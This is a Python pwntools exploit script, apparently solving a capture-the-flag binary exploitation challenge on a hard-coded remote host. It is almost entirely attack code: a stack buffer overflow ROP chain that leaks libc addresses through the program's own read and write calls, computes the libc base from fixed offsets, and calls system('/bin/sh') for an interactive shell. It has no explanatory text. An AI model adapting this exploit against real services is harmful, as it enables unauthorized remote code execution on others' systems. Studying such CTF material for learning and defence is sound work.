from pwn import*
import sys 

LIBCFILE = 'libc-2.28.so'
LIBCLOCAL = 'libc-2.28.so'
BINFILE = './external'
HOST = '161.97.176.150'
PORT = 9999



def solve(DEBUG):
    elf = ELF(BINFILE)
    libc = ELF(LIBCLOCAL)
    if DEBUG=="1":
        p = process(BINFILE)
        exploit(p,elf,libc)
    elif DEBUG=="2":
        libc = ELF(LIBCFILE)
        p = remote(HOST,PORT)
        exploit(p,elf,libc)
    else:
        p = process(BINFILE)
        raw_input('DEBUG')
        exploit(p,elf,libc)
        
def exploit(p,elf,libc):
    bss = 0x404600
    ret_to_main = 0x401224 
    pop_rsi_pop_r15_ret = 0x4012f1
    mov_eax_0_leave_ret = 0x401269 
    systemcall =  0x401283
    pop_rdi = 0x4012f3
    func_rtc = 0x00401110
    func_dtc = 0x004010e0
    func_ws = 0x0040127c 
    func_read = 0x401080
    base = 0x7f7774539f18
    
    
    p.recvuntil('> ')
    payload = "A"*0x50
    payload += p64(bss)
    payload += p64(func_rtc)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
    payload += p64(0x4012f1)
    payload += p64(0x404060)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(1)
    payload += p64(func_ws)
    payload += p64(mov_eax_0_leave_ret)
    
    
    p.sendline(payload)
    
    payload = p64(bss)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss+0x38)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
    p.send(payload)
    
    leak = p.recv(8)
    recv_stdout = u64(leak)
    print "stdout: ", hex(recv_stdout)  
    p.recv(8)
    leak = p.recv(8)
    recv_stdin = u64(leak)
    print "stdin: ", hex(recv_stdin) 
    
    offset_stdout = 0x1bc760
    offset_system = 0x0449c0
    offset_binsh = 0x181519
    print 'stdout: ', hex(offset_stdout)
    
    libc_base = recv_stdout - offset_stdout
    print 'base: ', hex(libc_base)
    
    system = libc_base + offset_system
    binsh = offset_binsh + libc_base
   
    payload = p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)
    
    p.send(payload)
    
        
        
    p.interactive()
          
solve(sys.argv[1])       
